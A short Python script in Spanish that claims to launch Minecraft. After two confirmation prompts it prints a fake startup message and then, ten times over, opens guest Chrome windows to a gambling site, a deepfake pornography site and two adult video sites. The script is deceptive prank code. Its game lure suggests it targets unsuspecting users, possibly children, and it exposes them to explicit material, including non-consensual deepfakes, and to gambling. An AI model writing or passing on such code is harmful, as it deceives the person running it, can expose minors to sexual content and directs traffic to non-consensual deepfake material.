import os
import time

opc = '';

while opc!='N':
    opc = input("Iniciar minecraft? [S/N]: ").upper();
    if opc=='S':
        while opc!='N':
            opc = input("Estas seguro de que si? [S/N]: ").upper();
            if opc=='S':
                break;
            elif opc=='N':
                exit();
        break;
    elif opc=='N':
        exit();

print("iniciando minecraft.....");

for j in range(10):
    os.system("start chrome --guest caliente.mx");
    os.system("start chrome --guest mrdeepfakes.com");
    os.system("start chrome --guest xnx.com");
    os.system("start chrome --guest xvideos.com");
    time.sleep(10);
